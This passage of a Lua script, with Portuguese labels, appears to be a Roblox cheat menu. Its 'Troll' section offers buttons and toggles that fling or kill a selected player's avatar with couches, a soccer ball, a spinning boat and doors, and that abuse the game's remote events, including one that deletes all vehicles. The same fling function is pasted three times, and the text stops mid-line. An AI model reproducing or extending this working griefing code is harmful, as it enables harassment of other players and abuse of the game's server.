v.Parent\n                                }\n                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Playe1rTrigge1rEven1t"):FireServer(unpack(args))\n                                local args = {\n                                    [1] = "DeleteAllVehicles"\n                                }\n                                game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer(unpack(args))\n                            end\n                        end\n                    end\n                end\n            end\n        end\n    end\nend\n\nTroll:AddButton({\n    Name = "MATA JOGADOR BAN",\n    Callback = houseBanKill\n})\n\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal flingAtivo = false\nlocal posicaoOriginal = nil\n\nlocal function iniciarLoopScript()\n    coroutine.wrap(function()\n        while flingAtivo do\n            pcall(function()\n                local selectedName = getgenv().Target\n                if not selectedName then return end\n\n                local Player = LocalPlayer\n                local TargetPlayer = Players:FindFirstChild(selectedName)\n                if not TargetPlayer or TargetPlayer == Player then return end\n\n                local Character = Player.Character\n                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")\n                local RootPart = Humanoid and Character:FindFirstChild("HumanoidRootPart")\n\n                local TChar = TargetPlayer.Character\n                local THumanoid = TChar and TChar:FindFirstChildOfClass("Humanoid")\n                local TRoot = THumanoid and TChar:FindFirstChild("HumanoidRootPart")\n                local THead = TChar and TChar:FindFirstChild("Head")\n                local Accessory = TChar and TChar:FindFirstChildOfClass("Accessory")\n                local Handle = Accessory and Accessory:FindFirstChild("Handle")\n\n                if Character and Humanoid and RootPart and TChar then\n                    local function FPos(BasePart, Pos, Ang)\n                        if not flingAtivo then return end\n                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang\n                        Character:SetPrimaryPartCFrame(RootPart.CFrame)\n                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)\n                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)\n                    end\n\n                    local function SFBasePart(BasePart)\n                        local t0 = tick()\n                        local Angle = 0\n                        repeat\n                            if not flingAtivo then break end\n                            if BasePart.Velocity.Magnitude < 50 then\n                                Angle += 900\n                                local vel = BasePart.Velocity.Magnitude / 1.25\n                                local dir = THumanoid.MoveDirection\n                                FPos(BasePart, CFrame.new(0, 1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()\n                                FPos(BasePart, CFrame.new(0, -1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()\n                            else\n                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)); task.wait()\n                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)); task.wait()\n                            end\n                        until BasePart.Velocity.Magnitude > 900 or tick() > t0 + 2\n                    end\n\n                    workspace.FallenPartsDestroyHeight = 0/0\n                    local BV = Instance.new("BodyVelocity", RootPart)\n                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)\n                    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n\n                    if TRoot and THead then\n                        SFBasePart((TRoot.Position - THead.Position).Magnitude > 5 and THead or TRoot)\n                    elseif TRoot then SFBasePart(TRoot)\n                    elseif THead then SFBasePart(THead)\n                    elseif Handle then SFBasePart(Handle) end\n\n                    BV:Destroy()\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n                end\n            end)\n            task.wait(1)\n        end\n    end)()\nend\n\n-- Toggle final e seguro\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal flingAtivo = false\nlocal posicaoOriginal = nil\n\nlocal function iniciarLoopScript()\n    coroutine.wrap(function()\n        while flingAtivo do\n            pcall(function()\n                local selectedName = getgenv().Target\n                if not selectedName then return end\n\n                local Player = LocalPlayer\n                local TargetPlayer = Players:FindFirstChild(selectedName)\n                if not TargetPlayer or TargetPlayer == Player then return end\n\n                local Character = Player.Character\n                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")\n                local RootPart = Humanoid and Character:FindFirstChild("HumanoidRootPart")\n\n                local TChar = TargetPlayer.Character\n                local THumanoid = TChar and TChar:FindFirstChildOfClass("Humanoid")\n                local TRoot = THumanoid and TChar:FindFirstChild("HumanoidRootPart")\n                local THead = TChar and TChar:FindFirstChild("Head")\n                local Accessory = TChar and TChar:FindFirstChildOfClass("Accessory")\n                local Handle = Accessory and Accessory:FindFirstChild("Handle")\n\n                if Character and Humanoid and RootPart and TChar then\n                    local function FPos(BasePart, Pos, Ang)\n                        if not flingAtivo then return end\n                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang\n                        Character:SetPrimaryPartCFrame(RootPart.CFrame)\n                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)\n                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)\n                    end\n\n                    local function SFBasePart(BasePart)\n                        local t0 = tick()\n                        local Angle = 0\n                        repeat\n                            if not flingAtivo then break end\n                            if BasePart.Velocity.Magnitude < 50 then\n                                Angle += 900\n                                local vel = BasePart.Velocity.Magnitude / 1.25\n                                local dir = THumanoid.MoveDirection\n                                FPos(BasePart, CFrame.new(0, 1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()\n                                FPos(BasePart, CFrame.new(0, -1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()\n                            else\n                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)); task.wait()\n                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)); task.wait()\n                            end\n                        until BasePart.Velocity.Magnitude > 900 or tick() > t0 + 2\n                    end\n\n                    workspace.FallenPartsDestroyHeight = 0/0\n                    local BV = Instance.new("BodyVelocity", RootPart)\n                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)\n                    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n\n                    if TRoot and THead then\n                        SFBasePart((TRoot.Position - THead.Position).Magnitude > 5 and THead or TRoot)\n                    elseif TRoot then SFBasePart(TRoot)\n                    elseif THead then SFBasePart(THead)\n                    elseif Handle then SFBasePart(Handle) end\n\n                    BV:Destroy()\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n                end\n            end)\n            task.wait(1)\n        end\n    end)()\nend\n\n-- Toggle final com desequipar ao desligar\nlocal Players = game:GetService("Players")\nlocal LocalPlayer = Players.LocalPlayer\nlocal flingAtivo = false\nlocal posicaoOriginal = nil\n\nlocal function iniciarLoopScript()\n    coroutine.wrap(function()\n        while flingAtivo do\n            pcall(function()\n                local selectedName = getgenv().Target\n                if not selectedName then return end\n\n                local Player = LocalPlayer\n                local TargetPlayer = Players:FindFirstChild(selectedName)\n                if not TargetPlayer or TargetPlayer == Player then return end\n\n                local Character = Player.Character\n                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")\n                local RootPart = Humanoid and Character:FindFirstChild("HumanoidRootPart")\n\n                local TChar = TargetPlayer.Character\n                local THumanoid = TChar and TChar:FindFirstChildOfClass("Humanoid")\n                local TRoot = THumanoid and TChar:FindFirstChild("HumanoidRootPart")\n                local THead = TChar and TChar:FindFirstChild("Head")\n                local Accessory = TChar and TChar:FindFirstChildOfClass("Accessory")\n                local Handle = Accessory and Accessory:FindFirstChild("Handle")\n\n                if Character and Humanoid and RootPart and TChar then\n                    local function FPos(BasePart, Pos, Ang)\n                        if not flingAtivo then return end\n                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang\n                        Character:SetPrimaryPartCFrame(RootPart.CFrame)\n                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)\n                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)\n                    end\n\n                    local function SFBasePart(BasePart)\n                        local t0 = tick()\n                        local Angle = 0\n                        repeat\n                            if not flingAtivo then break end\n                            if BasePart.Velocity.Magnitude < 50 then\n                                Angle += 900\n                                local vel = BasePart.Velocity.Magnitude / 1.25\n                                local dir = THumanoid.MoveDirection\n                                FPos(BasePart, CFrame.new(0, 1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()\n                                FPos(BasePart, CFrame.new(0, -1.5, 0) + dir * vel, CFrame.Angles(math.rad(Angle), 0, 0)); task.wait()\n                            else\n                                FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0)); task.wait()\n                                FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0)); task.wait()\n                            end\n                        until BasePart.Velocity.Magnitude > 900 or tick() > t0 + 2\n                    end\n\n                    workspace.FallenPartsDestroyHeight = 0/0\n                    local BV = Instance.new("BodyVelocity", RootPart)\n                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)\n                    BV.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n\n                    if TRoot and THead then\n                        SFBasePart((TRoot.Position - THead.Position).Magnitude > 5 and THead or TRoot)\n                    elseif TRoot then SFBasePart(TRoot)\n                    elseif THead then SFBasePart(THead)\n                    elseif Handle then SFBasePart(Handle) end\n\n                    BV:Destroy()\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n                end\n            end)\n            task.wait(1)\n        end\n    end)()\nend\n\n-- Toggle final sem deletar sof\225\nTroll:AddToggle({\n\tName = "FLING FATAL=\128",\n\tDefault = false,\n\tCallback = function(ativo)\n\t\tflingAtivo = ativo\n\n\t\tlocal char = LocalPlayer.Character\n\t\tlocal hrp = char and char:FindFirstChild("HumanoidRootPart")\n\t\tlocal selected = getgenv().Target\n\n\t\tif ativo and selected then\n\t\t\t-- Salvar posi\231\227o original\n\t\t\tif hrp then\n\t\t\t\tposicaoOriginal = hrp.CFrame\n\t\t\tend\n\n\t\t\t-- Se n\227o tiver o sof\225 nem equipado nem no backpack, tenta pegar\n\t\t\tlocal temCouch = LocalPlayer.Backpack:FindFirstChild("Couch") or (char and char:FindFirstChild("Couch"))\n\t\t\tif not temCouch then\n\t\t\t\tlocal args = { [1] = "PickingTools", [2] = "Couch" }\n\t\t\t\tlocal RE = game:GetService("ReplicatedStorage"):FindFirstChild("RE")\n\t\t\t\tif RE and RE:FindFirstChild("1Too1l") then\n\t\t\t\t\tpcall(function()\n\t\t\t\t\t\tRE["1Too1l"]:InvokeServer(unpack(args))\n\t\t\t\t\tend)\n\t\t\t\tend\n\t\t\tend\n\n\t\t\t-- Esperar sof\225 aparecer no backpack e equipar se ainda n\227o estiver\n\t\t\ttask.spawn(function()\n\t\t\t\tlocal maxTries, tries = 30, 0\n\t\t\t\trepeat\n\t\t\t\t\ttask.wait(0.1)\n\t\t\t\t\ttries += 1\n\t\t\t\tuntil LocalPlayer.Backpack:FindFirstChild("Couch") or tries >= maxTries\n\n\t\t\t\tlocal tool = LocalPlayer.Backpack:FindFirstChild("Couch")\n\t\t\t\tif tool and not (char:FindFirstChild("Couch")) then\n\t\t\t\t\ttool.Parent = char\n\t\t\t\tend\n\t\t\tend)\n\n\t\t\tiniciarLoopScript()\n\n\t\telse\n\t\t\t-- Desequipar sof\225 se estiver na m\227o (vai pra mochila)\n\t\t\tlocal tool = char and char:FindFirstChild("Couch")\n\t\t\tif tool then\n\t\t\t\ttool.Parent = LocalPlayer.Backpack\n\t\t\tend\n\n\t\t\t-- Resetar corpo e posi\231\227o com seguran\231a\n\t\t\tif hrp and posicaoOriginal then\n\t\t\t\thrp.Velocity = Vector3.zero\n\t\t\t\thrp.RotVelocity = Vector3.zero\n\n\t\t\t\tfor _, v in pairs(hrp:GetChildren()) do\n\t\t\t\t\tif v:IsA("BodyVelocity") then\n\t\t\t\t\t\tv:Destroy()\n\t\t\t\t\tend\n\t\t\t\tend\n\n\t\t\t\ttask.wait(0.1)\n\t\t\t\thrp.CFrame = posicaoOriginal\n\t\t\t\tprint("FLING parado e posi\231\227o restaurada com seguran\231a.")\n\t\t\tend\n\t\tend\n\tend\n})\n\n\nlocal function FlingBall(target)\n\n    local players = game:GetService("Players")\n    local player = players.LocalPlayer\n    local character = player.Character or player.CharacterAdded:Wait()\n    local humanoid = character:WaitForChild("Humanoid")\n    local hrp = character:WaitForChild("HumanoidRootPart")\n    local backpack = player:WaitForChild("Backpack")\n    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")\n\n    local function GetBall()\n        if not backpack:FindFirstChild("SoccerBall") then\n            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")\n        end\n        repeat task.wait() until backpack:FindFirstChild("SoccerBall")\n        backpack.SoccerBall.Parent = character\n        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. player.Name)\n        character.SoccerBall.Parent = backpack\n        return ServerBalls:FindFirstChild("Soccer" .. player.Name)\n    end\n\n    local Ball = ServerBalls:FindFirstChild("Soccer" .. player.Name) or GetBall()\n    Ball.CanCollide = false\n    Ball.Massless = true\n    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)\n\n    if target ~= player then\n        local tchar = target.Character\n        if tchar and tchar:FindFirstChild("HumanoidRootPart") and tchar:FindFirstChild("Humanoid") then\n            local troot = tchar.HumanoidRootPart\n            local thum = tchar.Humanoid\n\n            if Ball:FindFirstChildWhichIsA("BodyVelocity") then\n                Ball:FindFirstChildWhichIsA("BodyVelocity"):Destroy()\n            end\n\n            local bv = Instance.new("BodyVelocity")\n            bv.Name = "FlingPower"\n            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)\n            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n            bv.P = 9e900\n            bv.Parent = Ball\n\n            workspace.CurrentCamera.CameraSubject = thum\n            local StartTime = os.time()\n            repeat\n                if troot.Velocity.Magnitude > 0 then\n                -- C\225lculo da posi\231\227o ajustada com base na velocidade do alvo\n                local pos_x = troot.Position.X + (troot.Velocity.X / 1.5)\n                local pos_y = troot.Position.Y + (troot.Velocity.Y / 1.5)\n                local pos_z = troot.Position.Z + (troot.Velocity.Z / 1.5)\n\n                -- Posiciona a bola diretamente na posi\231\227o ajustada\n                local position = Vector3.new(pos_x, pos_y, pos_z)\n                Ball.CFrame = CFrame.new(position)\n                Ball.Orientation += Vector3.new(45, 60, 30)\nelse\nfor i, v in pairs(tchar:GetChildren()) do\nif v:IsA("BasePart") and v.CanCollide and not v.Anchored then\nBall.CFrame = v.CFrame\ntask.wait(1/6000)\nend\nend\nend\n                task.wait(1/6000)\n            until troot.Velocity.Magnitude > 1000 or thum.Health <= 0 or not tchar:IsDescendantOf(workspace) or target.Parent ~= players\n            workspace.CurrentCamera.CameraSubject = humanoid\n        end\n    end\nend\n\nTroll:AddButton({\n    Name = "FLING BOLA",\n    Callback = function()\n        FlingBall(game:GetService("Players")[selectedPlayerName])\n    end\n})\n\nlocal Players = game:GetService(\'Players\')\nlocal lplayer = Players.LocalPlayer\n\nlocal function isItemInInventory(itemName)\n    for _, item in pairs(lplayer.Backpack:GetChildren()) do\n        if item.Name == itemName then\n            return true\n        end\n    end\n    return false\nend\n\nlocal function equipItem(itemName)\n    local item = lplayer.Backpack:FindFirstChild(itemName)\n    if item then\n        lplayer.Character.Humanoid:EquipTool(item)\n    end\nend\n\nlocal function unequipItem(itemName)\n    local item = lplayer.Character:FindFirstChild(itemName)\n    if item then\n        item.Parent = lplayer.Backpack\n    end\nend\n\nlocal function ActiveAutoFling(targetPlayer)\n    if not isItemInInventory("Couch") then\n        local args = { [1] = "PickingTools", [2] = "Couch" }\n        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))\n    end\n\n    equipItem("Couch")\n    getgenv().flingloop = true\n\n    while getgenv().flingloop do\n        local function flingloopfix()\n            local Players = game:GetService("Players")\n            local Player = Players.LocalPlayer\n            local AllBool = false\n\n            local SkidFling = function(TargetPlayer)\n                local Character = Player.Character\n                local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")\n                local RootPart = Humanoid and Humanoid.RootPart\n                local TCharacter = TargetPlayer.Character\n                local THumanoid, TRootPart, THead, Accessory, Handle\n\n                if TCharacter:FindFirstChildOfClass("Humanoid") then\n                    THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")\n                end\n                if THumanoid and THumanoid.RootPart then\n                    TRootPart = THumanoid.RootPart\n                end\n                if TCharacter:FindFirstChild("Head") then\n                    THead = TCharacter.Head\n                end\n                if TCharacter:FindFirstChildOfClass("Accessory") then\n                    Accessory = TCharacter:FindFirstChildOfClass("Accessory")\n                end\n                if Accessory and Accessory:FindFirstChild("Handle") then\n                    Handle = Accessory.Handle\n                end\n\n                if Character and Humanoid and RootPart then\n                    if RootPart.Velocity.Magnitude < 50 then\n                        getgenv().OldPos = RootPart.CFrame\n                    end\n                    if THumanoid and THumanoid.Sit and not AllBool then\n                        unequipItem("Couch")\n                        getgenv().flingloop = false\n                        return\n                    end\n                    if THead then\n                        workspace.CurrentCamera.CameraSubject = THead\n                    elseif not THead and Handle then\n                        workspace.CurrentCamera.CameraSubject = Handle\n                    elseif THumanoid and TRootPart then\n                        workspace.CurrentCamera.CameraSubject = THumanoid\n                    end\n\n                    if not TCharacter:FindFirstChildWhichIsA("BasePart") then\n                        return\n                    end\n\n                    local FPos = function(BasePart, Pos, Ang)\n                        RootPart.CFrame = CFrame.new(BasePart.Position) * Pos * Ang\n                        Character:SetPrimaryPartCFrame(CFrame.new(BasePart.Position) * Pos * Ang)\n                        RootPart.Velocity = Vector3.new(9e7, 9e7 * 10, 9e7)\n                        RootPart.RotVelocity = Vector3.new(9e8, 9e8, 9e8)\n                    end\n\n                    local SFBasePart = function(BasePart)\n                        local TimeToWait = 2\n                        local Time = tick()\n                        local Angle = 0\n                        repeat\n                            if RootPart and THumanoid then\n                                if BasePart.Velocity.Magnitude < 50 then\n                                    Angle = Angle + 100\n                                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(2.25, 1.5, -2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(-2.25, -1.5, 2.25) + THumanoid.MoveDirection * BasePart.Velocity.Magnitude / 1.25, CFrame.Angles(math.rad(Angle), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, 1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, 0) + THumanoid.MoveDirection, CFrame.Angles(math.rad(Angle), 0, 0))\n                                    task.wait()\n                                else\n                                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, -THumanoid.WalkSpeed), CFrame.Angles(0, 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, 1.5, THumanoid.WalkSpeed), CFrame.Angles(math.rad(90), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, -TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(0, 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, 1.5, TRootPart.Velocity.Magnitude / 1.25), CFrame.Angles(math.rad(90), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(90), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(math.rad(-90), 0, 0))\n                                    task.wait()\n                                    FPos(BasePart, CFrame.new(0, -1.5, 0), CFrame.Angles(0, 0, 0))\n                                    task.wait()\n                                end\n                            else\n                                break\n                            end\n                        until BasePart.Velocity.Magnitude > 500 or BasePart.Parent ~= TargetPlayer.Character or TargetPlayer.Parent ~= Players or not TargetPlayer.Character == TCharacter or THumanoid.Sit or Humanoid.Health <= 0 or tick() > Time + TimeToWait or getgenv().flingloop == false\n                    end\n\n                    workspace.FallenPartsDestroyHeight = 0/0\n                    local BV = Instance.new("BodyVelocity")\n                    BV.Name = "SpeedDoPai"\n                    BV.Parent = RootPart\n                    BV.Velocity = Vector3.new(9e8, 9e8, 9e8)\n                    BV.MaxForce = Vector3.new(1/0, 1/0, 1/0)\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, false)\n\n                    if TRootPart and THead then\n                        if (TRootPart.CFrame.p - THead.CFrame.p).Magnitude > 5 then\n                            SFBasePart(THead)\n                        else\n                            SFBasePart(TRootPart)\n                        end\n                    elseif TRootPart and not THead then\n                        SFBasePart(TRootPart)\n                    elseif not TRootPart and THead then\n                        SFBasePart(THead)\n                    elseif not TRootPart and not THead and Accessory and Handle then\n                        SFBasePart(Handle)\n                    end\n                    BV:Destroy()\n                    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated, true)\n                    workspace.CurrentCamera.CameraSubject = Humanoid\n\n                    repeat\n                        RootPart.CFrame = getgenv().OldPos * CFrame.new(0, .5, 0)\n                        Character:SetPrimaryPartCFrame(getgenv().OldPos * CFrame.new(0, .5, 0))\n                        Humanoid:ChangeState("GettingUp")\n                        table.foreach(Character:GetChildren(), function(_, x)\n                            if x:IsA("BasePart") then\n                                x.Velocity, x.RotVelocity = Vector3.new(), Vector3.new()\n                            end\n                        end)\n                        task.wait()\n                    until (RootPart.Position - getgenv().OldPos.p).Magnitude < 25\n\n                    workspace.FallenPartsDestroyHeight = getgenv().FPDH\n                end\n            end\n\n            if AllBool then\n                for _, x in next, Players:GetPlayers() do\n                    SkidFling(x)\n                end\n            end\n\n            if targetPlayer then\n                SkidFling(targetPlayer)\n            end\n\n            task.wait()\n        end\n\n        wait()\n        pcall(flingloopfix)\n    end\nend\n\nlocal kill = Troll:AddSection({Name = "FLING BARCO"})\n\nTroll:AddButton({\n    Name = "FLING BARCO",\n    Callback = function()\n        if not selectedPlayerName or not game.Players:FindFirstChild(selectedPlayerName) then\n            warn("Nenhum jogador selecionado ou n\227o existe")\n            return\n        end\n\n        local Player = game.Players.LocalPlayer\n        local Character = Player.Character\n        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")\n        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")\n        local Vehicles = game.Workspace:FindFirstChild("Vehicles")\n\n        if not Humanoid or not RootPart then\n            warn("Humanoid ou RootPart inv\225lido")\n            return\n        end\n\n        local function spawnBoat()\n            RootPart.CFrame = CFrame.new(1754, -2, 58)\n            task.wait(0.5)\n            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("PickingBoat", "MilitaryBoatFree")\n            task.wait(1)\n            return Vehicles:FindFirstChild(Player.Name.."Car")\n        end\n\n        local PCar = Vehicles:FindFirstChild(Player.Name.."Car") or spawnBoat()\n        if not PCar then\n            warn("Falha ao spawnar o barco")\n            return\n        end\n\n        local Seat = PCar:FindFirstChild("Body") and PCar.Body:FindFirstChild("VehicleSeat")\n        if not Seat then\n            warn("Assento n\227o encontrado")\n            return\n        end\n\n        repeat \n            task.wait(0.1)\n            RootPart.CFrame = Seat.CFrame * CFrame.new(0, 1, 0)\n        until Humanoid.SeatPart == Seat\n\n        print("Barco spawnado!")\n\n        local TargetPlayer = game.Players:FindFirstChild(selectedPlayerName)\n        if not TargetPlayer or not TargetPlayer.Character then\n            warn("Jogador n\227o encontrado")\n            return\n        end\n\n        local TargetC = TargetPlayer.Character\n        local TargetH = TargetC:FindFirstChildOfClass("Humanoid")\n        local TargetRP = TargetC:FindFirstChild("HumanoidRootPart")\n\n        if not TargetRP or not TargetH then\n            warn("Humanoid ou RootPart do alvo n\227o encontrado")\n            return\n        end\n\n        local Spin = Instance.new("BodyAngularVelocity")\n        Spin.Name = "Spinning"\n        Spin.Parent = PCar.PrimaryPart\n        Spin.MaxTorque = Vector3.new(0, math.huge, 0)\n        Spin.AngularVelocity = Vector3.new(0, 369, 0) \n\n        print("Fling ativo!")\n\n        local function moveCar(TargetRP, offset)\n            if PCar and PCar.PrimaryPart then\n                PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + offset))\n            end\n        end\n\n        task.spawn(function()\n            while PCar and PCar.Parent and TargetRP and TargetRP.Parent do\n                task.wait(0.01) \n                \n                moveCar(TargetRP, Vector3.new(0, 1, 0))  \n                moveCar(TargetRP, Vector3.new(0, -2.25, 5))  \n                moveCar(TargetRP, Vector3.new(0, 2.25, 0.25))  \n                moveCar(TargetRP, Vector3.new(-2.25, -1.5, 2.25))  \n                moveCar(TargetRP, Vector3.new(0, 1.5, 0))  \n                moveCar(TargetRP, Vector3.new(0, -1.5, 0))  \n\n                if PCar and PCar.PrimaryPart then\n                    local Rotation = CFrame.Angles(\n                        math.rad(math.random(-369, 369)),  \n                        math.rad(math.random(-369, 369)), \n                        math.rad(math.random(-369, 369))\n                    )\n                    PCar:SetPrimaryPartCFrame(CFrame.new(TargetRP.Position + Vector3.new(0, 1.5, 0)) * Rotation)\n                end\n            end\n\n            if Spin and Spin.Parent then\n                Spin:Destroy()\n                print("Fling desativado")\n            end\n        end)\n    end\n})\nprint("Fling - Boat button created")\n\nTroll:AddButton({\n    Name = "DESATIVAR FLING BARCO",\n    Callback = function()\n        local Player = game.Players.LocalPlayer\n        local Character = Player.Character\n        local RootPart = Character and Character:FindFirstChild("HumanoidRootPart")\n        local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")\n        local Vehicles = game.Workspace:FindFirstChild("Vehicles")\n\n        if not RootPart or not Humanoid then\n            warn("Nenhum RootPart ou Humanoid encontrado!")\n            return\n        end\n\n        Humanoid.PlatformStand = true\n        print("Jogador paralisado para reduzir efeitos do spin.")\n\n        for _, obj in pairs(RootPart:GetChildren()) do\n            if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then\n                obj:Destroy()\n            end\n        end\n        print("Spin e for\231as removidas do jogador.")\n\n        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Ca1r"):FireServer("DeleteAllVehicles")\n        task.wait(0.5)\n\n        local PCar = Vehicles and Vehicles:FindFirstChild(Player.Name.."Car")\n        if PCar and PCar.PrimaryPart then\n            for _, obj in pairs(PCar.PrimaryPart:GetChildren()) do\n                if obj:IsA("BodyAngularVelocity") or obj:IsA("BodyVelocity") then\n                    obj:Destroy()\n                end\n            end\n            print("Spin removido do barco.")\n        end\n\n        task.wait(1)\n\n        local safePos = Vector3.new(0, 1000, 0)\n        local bp = Instance.new("BodyPosition", RootPart)\n        bp.Position = safePos\n        bp.MaxForce = Vector3.new(math.huge, math.huge, math.huge)\n\n        local bg = Instance.new("BodyGyro", RootPart)\n        bg.CFrame = RootPart.CFrame\n        bg.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)\n\n        print("Jogador est\225 preso na coordenada segura.")\n\n        task.wait(3)\n\n        bp:Destroy()\n        bg:Destroy()\n        Humanoid.PlatformStand = false\n\n        print("Jogador liberado, seguro na posi\231\227o.")\n    end\n})\n\nlocal kill = Troll:AddSection({Name = "FLING CLICKS"})\n\nTroll:AddButton({\n  Name = "FLING PORTA CLICK",\nDescription = "FIQUE PERTO DAS PORTAS",\n  Callback = function()\nlocal Players = game:GetService("Players")\nlocal Workspace = game:GetService("Workspace")\nlocal RunService = game:GetService("RunService")\nlocal UserInputService = game:GetService("UserInputService")\n\nlocal LocalPlayer = Players.LocalPlayer\nlocal Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()\nlocal HRP = Character:WaitForChild("HumanoidRootPart")\n\n-- Alvo invis\237vel (BlackHole)\nlocal BlackHole = Instance.new("Part")\nBlackHole.Size = Vector3.new(100000, 100000, 100000)\nBlackHole.Transparency = 1\nBlackHole.Anchored = true\nBlackHole.CanCollide = false\nBlackHole.Name = "BlackHoleTarget"\nBlackHole.Parent = Workspace\n\n-- Attachment base no BlackHole\nlocal baseAttachment = Instance.new("Attachment")\nbaseAttachment.Name = "Luscaa_BlackHoleAttachment"\nbaseAttachment.Parent = BlackHole\n\n-- Atualiza posi\231\227o do BlackHole\nRunService.Heartbeat:Connect(function()\n\tBlackHole.CFrame = HRP.CFrame\nend)\n\n-- Lista de portas controladas\nlocal ControlledDoors = {}\n\n-- Prepara uma porta para ser controlada\nlocal function SetupPart(part)\n\tif not part:IsA("BasePart") or part.Anchored or not string.find(part.Name, "Door") then return end\n\tif part:FindFirstChild("Luscaa_Attached") then return end\n\n\tpart.CanCollide = false\n\n\tfor _, obj in ipairs(part:GetChildren()) do\n\t\tif obj:IsA("AlignPosition") or obj:IsA("Torque") or obj:IsA("Attachment") 